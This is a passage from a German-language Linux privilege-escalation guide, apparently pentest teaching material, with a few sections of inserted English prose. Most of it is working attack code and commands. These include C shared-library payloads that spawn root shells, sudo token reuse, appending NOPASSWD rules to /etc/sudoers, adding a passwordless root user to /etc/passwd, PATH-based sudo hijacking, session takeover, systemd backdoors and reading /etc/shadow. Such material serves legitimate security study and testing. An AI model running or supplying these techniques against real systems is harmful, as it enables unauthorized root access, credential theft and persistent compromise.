Wenn Sie auf eine Binärdatei mit **SUID**-Berechtigungen stoßen, die ungewöhnlich erscheint, ist es ratsam zu überprüfen, ob sie **.so**-Dateien ordnungsgemäß lädt. Dies kann mit dem folgenden Befehl überprüft werden:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (Datei oder Verzeichnis nicht gefunden)"_ auf ein mögliches Ausnutzungspotenzial hin.

Um dies auszunutzen, würde man folgendermaßen vorgehen, indem man eine C-Datei erstellt, sagen wir _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt darauf ab, nach dem Kompilieren und Ausführen die Berechtigungen zu erhöhen, indem er Dateiberechtigungen manipuliert und eine Shell mit erhöhten Privilegien ausführt.

Kompilieren Sie die oben genannte C-Datei in eine Shared Object (.so) Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID-Binärdatei den Exploit auslösen und potenzielle Kompromittierung des Systems ermöglichen.


## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Jetzt, da wir eine SUID-Binärdatei gefunden haben, die eine Bibliothek aus einem Ordner lädt, in dem wir schreiben können, erstellen wir die Bibliothek in diesem Ordner mit dem erforderlichen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Das bedeutet, dass die von Ihnen generierte Bibliothek eine Funktion namens `a_function_name` haben muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binärdateien, die von einem Angreifer genutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, gilt jedoch für Fälle, in denen Sie nur Argumente in einem Befehl **einschleusen** können.

Das Projekt sammelt legitime Funktionen von Unix-Binärdateien, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Berechtigungen zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, Bind- und Reverse-Shells zu starten und andere Aufgaben nach der Ausnutzung durchzuführen.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Wenn Sie auf `sudo -l` zugreifen können, können Sie das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu überprüfen, ob es eine Möglichkeit gibt, eine sudo-Regel auszunutzen.

### Wiederverwendung von Sudo-Token

In Fällen, in denen Sie **sudo-Zugriff** haben, aber nicht das Passwort, können Sie Berechtigungen eskalieren, indem Sie **auf die Ausführung eines sudo-Befehls warten und dann das Sitzungstoken übernehmen**.

Voraussetzungen für die Eskalation von Berechtigungen:

* Sie haben bereits eine Shell als Benutzer "_sampleuser_"
* "_sampleuser_" hat in den **letzten 15 Minuten** `sudo` verwendet, um etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, das es uns ermöglicht, `sudo` ohne Eingabe eines Passworts zu verwenden)
* `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
* `gdb` ist zugänglich (Sie können es hochladen)

(Sie können `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft in `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` festlegen)

Wenn all diese Voraussetzungen erfüllt sind, können Sie Berechtigungen eskalieren, indem Sie [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject) verwenden.

* Der **erste Exploit** (`exploit.sh`) erstellt die Binärdatei `activate_sudo_token` in _/tmp_. Sie können es verwenden, um das sudo-Token in Ihrer Sitzung zu **aktivieren** (Sie erhalten nicht automatisch eine Root-Shell, führen Sie `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Der **zweite Exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, **die root gehört und setuid ist**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
*Der **dritte Exploit** (`exploit_v3.sh`) wird eine sudoers-Datei erstellen, die sudo-Token dauerhaft macht und es allen Benutzern ermöglicht, sudo zu verwenden.*
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Benutzername>

Wenn Sie **Schreibberechtigungen** im Ordner oder auf einer der erstellten Dateien im Ordner haben, können Sie das Binärprogramm [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) verwenden, um **einen sudo-Token für einen Benutzer und eine PID zu erstellen**.\
Wenn Sie beispielsweise die Datei _/var/run/sudo/ts/beispielbenutzer_ überschreiben können und eine Shell als dieser Benutzer mit der PID 1234 haben, können Sie **sudo-Berechtigungen erlangen**, ohne das Passwort zu kennen, indem Sie Folgendes tun:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` konfigurieren, wer `sudo` verwenden kann und wie. Diese Dateien können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden.\
Wenn Sie diese Datei lesen können, könnten Sie in der Lage sein, einige interessante Informationen zu erhalten, und wenn Sie eine beliebige Datei schreiben können, können Sie Privilegien eskalieren.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn Sie schreiben können, können Sie diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo`-Binärdatei wie `doas` für OpenBSD. Denken Sie daran, die Konfiguration unter `/etc/doas.conf` zu überprüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn Sie wissen, dass ein **Benutzer normalerweise eine Verbindung zu einer Maschine herstellt und `sudo` verwendet**, um Privilegien zu eskalieren, und Sie eine Shell im Kontext dieses Benutzers haben, können Sie **eine neue sudo-Ausführungsdatei erstellen**, die Ihren Code als Root ausführt und dann den Befehl des Benutzers. Ändern Sie dann den $PATH des Benutzerkontexts (z. B. indem Sie den neuen Pfad in .bash\_profile hinzufügen), damit beim Ausführen von sudo durch den Benutzer Ihre sudo-Ausführungsdatei ausgeführt wird.

Beachten Sie, dass Sie, wenn der Benutzer eine andere Shell verwendet (nicht bash), andere Dateien ändern müssen, um den neuen Pfad hinzuzufügen. Zum Beispiel ändert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel finden Sie in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Oder führen Sie etwas wie aus:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsam genutzte Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. In der Regel enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien von `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel enthält der Inhalt von `/etc/ld.so.conf.d/libc.conf` den Pfad `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibberechtigungen** für einen der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, irgendeine Datei innerhalb von `/etc/ld.so.conf.d/` oder irgendein Ordner innerhalb der Konfigurationsdatei innerhalb von `/etc/ld.so.conf.d/*.conf`, könnte er in der Lage sein, Privilegien zu eskalieren.\
Schauen Sie sich an, **wie diese Fehlkonfiguration ausgenutzt werden kann**, auf der folgenden Seite:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch das Kopieren der Bibliothek in `/var/tmp/flag15/` wird sie vom Programm an diesem Ort verwendet, wie in der `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Dann erstellen Sie eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Fähigkeiten

Linux-Fähigkeiten bieten einem Prozess eine **Teilmenge der verfügbaren Root-Privilegien**. Dadurch werden Root-Privilegien effektiv in kleinere und unterscheidbare Einheiten aufgeteilt. Jede dieser Einheiten kann unabhängig anderen Prozessen gewährt werden. Auf diese Weise wird der vollständige Satz an Privilegien reduziert, was das Risiko von Ausnutzungen verringert.\
Lesen Sie die folgende Seite, um **mehr über Fähigkeiten zu erfahren und wie man sie missbraucht**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **"Ausführen"-Bit**, dass der betroffene Benutzer in das Verzeichnis "**cd**" kann.\
Das **"Lesen"-Bit** bedeutet, dass der Benutzer die **Dateien auflisten** kann, und das **"Schreiben"-Bit** bedeutet, dass der Benutzer **Dateien löschen** und **neue Dateien erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der discretionary permissions dar und können die traditionellen ugo/rwx-Berechtigungen **außer Kraft setzen**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die nicht Eigentümer oder Teil der Gruppe sind, Rechte gewähren oder verweigern. Diese Granularitätsebene gewährleistet eine präzisere Zugriffsverwaltung. Weitere Details finden Sie [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Geben Sie** dem Benutzer "kali" Lese- und Schreibberechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Holen** Sie Dateien mit bestimmten ACLs vom System:

```bash
getfacl -R / 2>/dev/null | grep -E "user::rwx|group::r-x|other::r-x" > files_with_specific_acls.txt
```

Dieser Befehl ruft die ACLs für alle Dateien im System ab und filtert dann nach den spezifischen ACLs, die mit "user::rwx", "group::r-x" oder "other::r-x" übereinstimmen. Die Ergebnisse werden in der Datei "files_with_specific_acls.txt" gespeichert.
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene Shell-Sitzungen

In **alten Versionen** können Sie möglicherweise eine **Shell-Sitzung** eines anderen Benutzers (**root**) **übernehmen**.\
In den **neuesten Versionen** können Sie nur **Ihre eigenen Benutzersitzungen** von **Screen** verbinden. Sie könnten jedoch **interessante Informationen in der Sitzung finden**.

### Übernahme von Screen-Sitzungen

**Liste der Screen-Sitzungen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Sitzung anhängen**

Um eine laufende Sitzung zu übernehmen, können Sie den Befehl `attach` verwenden. Dies ermöglicht es Ihnen, die Kontrolle über eine bereits laufende Sitzung zu übernehmen und mit dem Benutzerinteraktionsprozess fortzufahren.

```bash
$ screen -ls
There is a screen on:
        12345.pts-0.hostname     (Detached)
1 Socket in /var/run/screen/S-root.

$ screen -r 12345
```

Der Befehl `screen -ls` zeigt alle laufenden Sitzungen an. In diesem Beispiel gibt es eine Sitzung mit der ID `12345.pts-0.hostname`. Mit dem Befehl `screen -r 12345` können Sie diese Sitzung übernehmen und mit dem Benutzerinteraktionsprozess fortfahren.

**Hinweis:** Das `screen`-Tool muss auf dem System installiert sein, um diese Methode verwenden zu können.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux-Sitzungen übernehmen

Dies war ein Problem mit **alten tmux-Versionen**. Ich konnte keine tmux (v2.1)-Sitzung übernehmen, die von root als nicht privilegierter Benutzer erstellt wurde.

**Liste tmux-Sitzungen**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Sitzung anhängen**

Um eine laufende Sitzung zu übernehmen, können Sie den Befehl `attach` verwenden. Dies ermöglicht es Ihnen, die Kontrolle über eine bereits laufende Sitzung zu übernehmen, anstatt eine neue Sitzung zu starten. Dies kann besonders nützlich sein, wenn Sie bereits in einer Sitzung arbeiten und diese beibehalten möchten, anstatt eine neue zu starten.

Um eine Sitzung anzuhängen, verwenden Sie den folgenden Befehl:

```
tmux attach-session -t <session-name>
```

Ersetzen Sie `<session-name>` durch den Namen der Sitzung, zu der Sie eine Verbindung herstellen möchten. Wenn Sie den Namen der Sitzung nicht kennen, können Sie den Befehl `tmux list-sessions` verwenden, um eine Liste der verfügbaren Sitzungen anzuzeigen.

Wenn Sie erfolgreich eine Sitzung angehängt haben, haben Sie die volle Kontrolle über die Sitzung und können alle darin ausgeführten Befehle sehen und ausführen.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Überprüfen Sie **Valentine-Box von HTB** für ein Beispiel.

## SSH

### Debian OpenSSL Vorhersehbarer PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu usw.) zwischen September 2006 und dem 13. Mai 2008 generiert wurden, können von diesem Fehler betroffen sein.\
Dieser Fehler tritt auf, wenn ein neuer SSH-Schlüssel in diesen Betriebssystemen erstellt wird, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **mit dem SSH-Public-Key nach dem entsprechenden Private-Key gesucht werden kann**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Interessante SSH-Konfigurationswerte

* **PasswordAuthentication:** Gibt an, ob die Passwortauthentifizierung erlaubt ist. Der Standardwert ist `no`.
* **PubkeyAuthentication:** Gibt an, ob die Public-Key-Authentifizierung erlaubt ist. Der Standardwert ist `yes`.
* **PermitEmptyPasswords**: Wenn die Passwortauthentifizierung erlaubt ist, gibt es an, ob der Server die Anmeldung bei Konten mit leeren Passwortzeichenketten zulässt. Der Standardwert ist `no`.

### PermitRootLogin

Gibt an, ob sich der Root-Benutzer über SSH anmelden kann. Der Standardwert ist `no`. Mögliche Werte:

* `yes`: Root kann sich mit Passwort und privatem Schlüssel anmelden
* `without-password` oder `prohibit-password`: Root kann sich nur mit einem privaten Schlüssel anmelden
* `forced-commands-only`: Root kann sich nur mit einem privaten Schlüssel anmelden und nur wenn die Befehlsoptionen angegeben sind
* `no` : nein

### AuthorizedKeysFile

Gibt die Dateien an, die die öffentlichen Schlüssel enthalten, die für die Benutzerauthentifizierung verwendet werden können. Es können Platzhalter wie `%h` verwendet werden, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade** (beginnend mit `/`) oder **relative Pfade vom Benutzer-Home** angeben. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration gibt an, dass wenn Sie versuchen, sich mit dem **privaten** Schlüssel des Benutzers "**testusername**" anzumelden, SSH den öffentlichen Schlüssel Ihres Schlüssels mit denen vergleicht, die in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` gespeichert sind.

### ForwardAgent/AllowAgentForwarding

SSH-Agent-Weiterleitung ermöglicht es Ihnen, Ihre lokalen SSH-Schlüssel zu verwenden, anstatt Schlüssel (ohne Passphrasen!) auf Ihrem Server zu hinterlassen. Dadurch können Sie über SSH zu einem Host **springen** und von dort aus mit dem **Schlüssel** auf Ihrem **ursprünglichen Host** zu einem anderen Host **springen**.

Sie müssen diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachten Sie, dass wenn `Host` `*` ist, kann jeder Host, zu dem der Benutzer wechselt, auf die Schlüssel zugreifen (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese Optionen **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann mit dem Schlüsselwort `AllowAgentForwarding` (Standard ist erlauben) das Weiterleiten des ssh-Agenten erlauben oder verweigern.

Wenn Sie feststellen, dass Forward Agent in einer Umgebung konfiguriert ist, lesen Sie die folgende Seite, da **Sie möglicherweise Missbrauch betreiben können, um Privilegien zu eskalieren**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interessante Dateien

### Profildateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher können Sie, wenn Sie eine dieser Dateien schreiben oder ändern können, Privilegien eskalieren.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein seltsames Profilskript gefunden wird, sollten Sie es auf **sensible Details** überprüfen.

### Passwd/Shadow-Dateien

Je nach Betriebssystem können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es kann eine Sicherungskopie geben. Daher wird empfohlen, **alle von ihnen zu finden** und zu überprüfen, ob Sie sie lesen können, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen können Sie **Passwort-Hashes** in der Datei `/etc/passwd` (oder einer äquivalenten Datei) finden.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbar /etc/passwd

Zuerst generieren Sie ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Dann fügen Sie den Benutzer `hacker` hinzu und fügen Sie das generierte Passwort hinzu.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sie können nun den Befehl `su` mit `hacker:hacker` verwenden.

Alternativ können Sie die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch kann die aktuelle Sicherheit des Systems beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**HINWEIS:** Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wird `/etc/shadow` in `/etc/spwd.db` umbenannt.

Sie sollten überprüfen, ob Sie in der Lage sind, **in bestimmte sensible Dateien zu schreiben**. Können Sie beispielsweise in eine **Dienstkonfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Wenn die Maschine beispielsweise einen **Tomcat**-Server ausführt und Sie die **Tomcat-Service-Konfigurationsdatei innerhalb von /etc/systemd/ ändern können**, können Sie die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Dein Backdoor wird beim nächsten Start von Tomcat ausgeführt.

### Überprüfe Ordner

Folgende Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Du wirst wahrscheinlich den letzten Ordner nicht lesen können, aber versuche es trotzdem)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsame Standorte/Eigene Dateien

One common technique used in privilege escalation is to search for files in unusual locations or files owned by privileged users. These files may contain sensitive information or have misconfigured permissions that can be exploited.

#### Searching for Unusual Locations

When performing a privilege escalation, it is important to search for files in locations that are not commonly checked by administrators. Some examples of unusual locations to search for include:

- `/var/backups`: This directory often contains backup files that may contain sensitive information.
- `/var/lib/docker`: If Docker is installed, this directory may contain configuration files or credentials.
- `/opt`: This directory is often used for installing third-party software and may contain files with elevated privileges.
- `/tmp`: Temporary directories are often overlooked but may contain files with sensitive information.

To search for files in these locations, you can use the `find` command:

```bash
find /var/backups /var/lib/docker /opt /tmp -type f
```

#### Owned Files

Another approach is to search for files owned by privileged users. These files may have misconfigured permissions that allow non-privileged users to modify or execute them. Some common files to check include:

- `/etc/passwd`: This file contains user account information, including hashed passwords.
- `/etc/shadow`: This file contains the encrypted passwords for user accounts.
- `/etc/sudoers`: This file defines which users can run commands with elevated privileges using `sudo`.
- `/etc/cron.d`: This directory contains cron jobs that are executed automatically at specified times.

To search for files owned by privileged users, you can use the `find` command with the `-user` option:

```bash
find / -user root -type f
```

Remember to analyze the permissions and contents of any files you find in these unusual locations or owned by privileged users. They may provide valuable information or opportunities for privilege escalation.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten

To identify recently modified files on a Linux system, you can use the following command:

```bash
find / -type f -mmin -N
```

Replace `N` with the number of minutes you want to search for. This command will search for regular files (`-type f`) that have been modified within the last `N` minutes (`-mmin -N`).

Keep in mind that this command will search the entire filesystem, so it may take some time to complete. Additionally, you may need root privileges to search certain directories.

Once you have the list of modified files, you can analyze them to identify any suspicious changes that may indicate a security breach or unauthorized activity.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien

SQLite ist eine weit verbreitete relationale Datenbank-Engine, die in vielen Anwendungen verwendet wird. Oft enthalten diese Anwendungen SQLite-Datenbankdateien, die sensible Informationen wie Benutzernamen, Passwörter oder andere vertrauliche Daten enthalten können.

Um auf diese Datenbankdateien zuzugreifen, können Sie verschiedene Techniken verwenden:

#### 1. Dateisystemzugriff

Überprüfen Sie das Dateisystem nach SQLite-Datenbankdateien. Diese Dateien haben normalerweise die Erweiterung ".db" oder ".sqlite". Sie können nach diesen Dateien suchen, indem Sie Befehle wie `find` oder `locate` verwenden.

#### 2. SQLite-Befehlszeilentool

SQLite bietet ein Befehlszeilentool namens `sqlite3`, mit dem Sie auf SQLite-Datenbankdateien zugreifen können. Sie können das Tool verwenden, um die Datenbankdatei zu öffnen und SQL-Befehle auszuführen, um auf die darin enthaltenen Informationen zuzugreifen.

#### 3. SQLite-Datenbankdateien in Anwendungen

Einige Anwendungen verwenden SQLite-Datenbankdateien, um Daten zu speichern. Sie können versuchen, die Anwendung zu analysieren, um herauszufinden, wo die Datenbankdatei gespeichert ist. Dies kann in der Konfigurationsdatei der Anwendung oder im Quellcode angegeben sein.

#### 4. Datenbank-Dateien in temporären Verzeichnissen

Manchmal werden SQLite-Datenbankdateien in temporären Verzeichnissen gespeichert. Überprüfen Sie diese Verzeichnisse, um zu sehen, ob Sie auf die Datenbankdateien zugreifen können.

#### 5. Berechtigungen

Überprüfen Sie die Berechtigungen der SQLite-Datenbankdateien. Wenn Sie Schreibzugriff auf die Datei haben, können Sie möglicherweise die Datenbank manipulieren oder Informationen daraus extrahieren.

Es ist wichtig zu beachten, dass der Zugriff auf SQLite-Datenbankdateien ohne die entsprechenden Berechtigungen illegal sein kann. Stellen Sie sicher, dass Sie die geltenden Gesetze und Vorschriften einhalten, wenn Sie auf solche Dateien zugreifen.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien

Diese Dateien können möglicherweise sensible Informationen enthalten oder als Angriffsvektor für Privilege Escalation dienen. Es ist wichtig, sie zu überprüfen und sicherzustellen, dass sie ordnungsgemäß geschützt sind.
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien

In Linux können Dateien und Verzeichnisse als versteckt markiert werden, indem ein Punkt (`.`) am Anfang des Datei- oder Verzeichnisnamens hinzugefügt wird. Versteckte Dateien sind standardmäßig in der Ausgabe von Befehlen wie `ls` nicht sichtbar. Um versteckte Dateien anzuzeigen, verwenden Sie den Befehl `ls -a` oder `ls -al`.

Versteckte Dateien werden oft verwendet, um sensible Informationen zu speichern oder um Konfigurationsdateien zu verbergen, die von normalen Benutzern nicht bearbeitet werden sollten. Beim Durchsuchen eines Systems nach Schwachstellen oder bei der Privilege Escalation ist es wichtig, auch versteckte Dateien zu überprüfen, da sie möglicherweise wertvolle Informationen enthalten können.

Um versteckte Dateien zu finden, können Sie den Befehl `find` verwenden. Zum Beispiel:

```bash
find / -name ".*"
```

Dieser Befehl sucht nach allen versteckten Dateien im gesamten Dateisystem. Beachten Sie jedoch, dass die Suche nach versteckten Dateien zeitaufwändig sein kann, insbesondere wenn Sie das gesamte Dateisystem durchsuchen.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien im PATH**

Ein häufiger Ansatz zur Eskalation von Privilegien besteht darin, nach Skripten oder Binärdateien zu suchen, die im PATH des Benutzers liegen. Wenn ein Angreifer eine bösartige Datei mit demselben Namen wie eine legitime Datei erstellt und diese in einem Verzeichnis platziert, das vor dem Verzeichnis der legitimen Datei im PATH steht, kann der Angreifer die Kontrolle über das System übernehmen, wenn der Benutzer das Skript oder die Binärdatei ausführt.

